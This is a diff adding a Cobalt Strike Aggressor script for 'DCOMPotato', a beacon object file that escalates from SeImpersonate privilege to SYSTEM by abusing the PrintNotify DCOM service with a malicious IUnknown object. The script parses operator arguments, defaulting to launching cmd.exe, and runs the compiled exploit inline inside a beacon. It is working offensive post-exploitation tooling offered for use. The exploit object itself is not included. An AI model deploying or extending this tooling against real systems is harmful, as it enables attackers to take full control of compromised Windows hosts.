@@ -1,0 +1,98 @@
+#DCOMPotato Bof
+#created by Hagrid29
+
+beacon_command_register("DCOMPotato", "Obtain SYSTEM privilege with SeImpersonate privilege by passing a malicious IUnknwon object to DCOM call of PrintNotify.", 
+	"DCOMPotato --pprog [program to launch <optional, default cmd.exe>] --pargs [argument <optional>] --pmode [API to create process <1: CreateProcessWithTokenW or 2: CreateProcessAsUser> <optional, default 1>]");
+
+alias DCOMPotato {
+	$bid = $1;
+	local('$args $p $a $m $_pArgs $_progArgs');
+	@CliOptions = @("--pprog", "--pargs", "--pmode");
+	$_pArgs = "";
+	$_progArgs = "";
+
+	$input = substr($0, 10);
+    	@args = split(' ', $input);
+
+	for($i = 0; $i < size(@args); $i++){
+		if(@args[$i] iswm "--pprog"){
+		    $i = $i + 1;
+		    $p = @args[$i];
+		}
+		if(@args[$i] iswm "--pargs"){
+			$i = $i + 1; 
+			$count = 0;  
+			for ($j = $i; $j < size(@args); $j++){
+				if(@args[$j] in @CliOptions){
+					break;
+				}else{
+				  @_progArgs[$count] = @args[$j];
+				  
+				  #Taking care of arguments embedded within single/double quotes and consider it as one single argument (disregarding spaces).
+				  if(('"' isin @_progArgs[$count] || "'" isin @_progArgs[$count])){
+	
+					$k = 0;
+					$j = $j + 1;
+					
+					for($k = $j; $k < size(@args); $k++){
+					  if(lindexOf(@_progArgs[$count], '"') == (strlen(@_progArgs[$count]) - 1) || lindexOf(@_progArgs[$count], "'") == (strlen(@_progArgs[$count]) - 1)){
+						$k = $k - 1;
+						break;
+					  }
+					  if('"' isin @args[$k] || "'" isin @args[$k]){
+						@_progArgs[$count] = @_progArgs[$count]." ".@args[$k];
+						break;
+					  }else{
+						@_progArgs[$count] = @_progArgs[$count]." ".@args[$k];
+					  }
+					}
+	
+					$j = $k;
+					$i = $k;
+				  }
+	
+				  $count = $count + 1;
+						  
+				}
+			}
+		}
+		if(@args[$i] iswm "--pmode"){
+		    $i = $i + 1;
+		    $m = @args[$i];
+		}
+    	}
+	
+	for ($i = 0; $i < size(@_progArgs); $i++){
+		if (@_progArgs[$i] ne "") {
+			if ($_pArgs ne "")
+			{
+				$_pArgs = $_pArgs." ".@_progArgs[$i];
+			}
+			else
+			{
+				$_pArgs = @_progArgs[$i];
+			}
+		
+		}
+	}
+	
+	if($p eq ""){
+		$p = "cmd.exe"
+	}
+
+	$barch  = barch($1);
+	$handle = openf(script_resource("DCOMPotato. $+ $barch $+ .o"));
+	$data   = readb($handle, -1);
+	closef($handle);
+
+	$arg_data = bof_pack($bid, "zzi", $p, $_pArgs, $m);
+	beacon_inline_execute($bid, $data, "go", $arg_data);
+	
+	clear(@p);
+	clear(@_pArgs);
+	clear(@_progArgs);
+	clear(@m);
+	clear(@a);
+	clear(@args);
+
+}
